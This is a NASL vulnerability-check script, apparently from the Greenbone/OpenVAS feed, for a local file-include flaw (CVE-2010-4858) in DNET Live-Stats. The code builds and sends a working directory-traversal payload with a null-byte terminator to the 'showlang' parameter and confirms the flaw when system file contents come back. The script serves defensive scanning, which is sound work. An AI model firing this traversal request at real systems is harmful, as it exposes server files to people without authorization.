if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100841" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-10-05 12:35:02 +0200 (Tue, 05 Oct 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2010-4858" );
	script_bugtraq_id( 43708 );
	script_name( "DNET Live-Stats 'team.rc5-72.php' Local File Include Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/43708" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/dnetlivestats/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "DNET Live-Stats is prone to a local file-include vulnerability because
it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability using directory-traversal
strings to view files and execute local scripts in the context of the
webserver process. This may aid in further attacks.

DNET Live-Stats 0.8 RC8 is vulnerable, other versions may also
be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/dnet", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		url = NASLString( dir, "/team.rc5-72.php?showlang=", crap( data: "../", length: 3 * 9 ), files[file], "%00" );
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

